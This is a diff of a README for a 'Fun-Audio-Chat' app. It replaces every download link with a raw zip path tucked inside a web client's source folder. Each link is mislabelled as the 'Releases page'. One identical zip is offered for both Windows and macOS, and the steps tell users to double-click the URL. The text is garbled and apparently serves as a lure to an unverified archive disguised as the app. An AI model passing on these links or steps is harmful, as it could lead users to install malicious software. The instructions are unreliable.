@@ -17,21 +17,21 @@ To run Fun-Audio-Chat smoothly, you will need:
 
 ### 📥 Download Fun-Audio-Chat
 
-[![Download Fun-Audio-Chat](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip)](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip)
+[![Download Fun-Audio-Chat](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip)](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip)
 
 ### 📝 Download & Install
 
-1. **Visit the Releases Page:** Click this link to access the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip).
+1. **Visit the Releases Page:** Click this link to access the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip).
   
 2. **Choose the Latest Version:** On the releases page, look for the latest version of Fun-Audio-Chat. It’s usually at the top of the list. 
 
 3. **Download the Application:**
-   - Find the file that matches your operating system. For Windows, it might be "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip", and for macOS, it could be "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip".
+   - Find the file that matches your operating system. For Windows, it might be "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip", and for macOS, it could be "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip".
    - Click on the file name to start the download.
 
 4. **Open the Downloaded File:**
-   - For Windows: Navigate to your Downloads folder and double-click on "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip". 
-   - For macOS: Go to your Downloads folder and double-click on "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip".
+   - For Windows: Navigate to your Downloads folder and double-click on "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip". 
+   - For macOS: Go to your Downloads folder and double-click on "https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip".
 
 5. **Follow the Installation Instructions:**
    - On Windows: A setup wizard will guide you through the installation. Just follow the prompts and click 'Next' until the installation is complete.
@@ -64,7 +64,7 @@ If you run into issues, here are common problems and solutions:
 
 - **Microphone Not Recognized:** Check your microphone connection and ensure it’s set as the default recording device.
 - **App Not Opening:** Make sure your operating system is up to date. Restart your computer before trying again.
-- **Software Crashes:** Redownload the application from the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip) to ensure you have the latest version.
+- **Software Crashes:** Redownload the application from the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip) to ensure you have the latest version.
 
 ### 🌟 Join the Community
 
@@ -76,6 +76,6 @@ To get the most out of Fun-Audio-Chat, consider engaging with our community.
 
 ### 📣 Stay Informed
 
-Don’t forget to check back at the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/protocol/Audio_Fun_Chat_3.6.zip) for updates. We frequently add new features and improvements, making your experience even better.
+Don’t forget to check back at the [Releases page](https://github.com/ANISWAM/Fun-Audio-Chat/raw/refs/heads/main/web_demo/client/src/pages/Queue/Audio_Fun_Chat_v2.9.zip) for updates. We frequently add new features and improvements, making your experience even better.
 
 Enjoy using Fun-Audio-Chat, and have fun chatting!
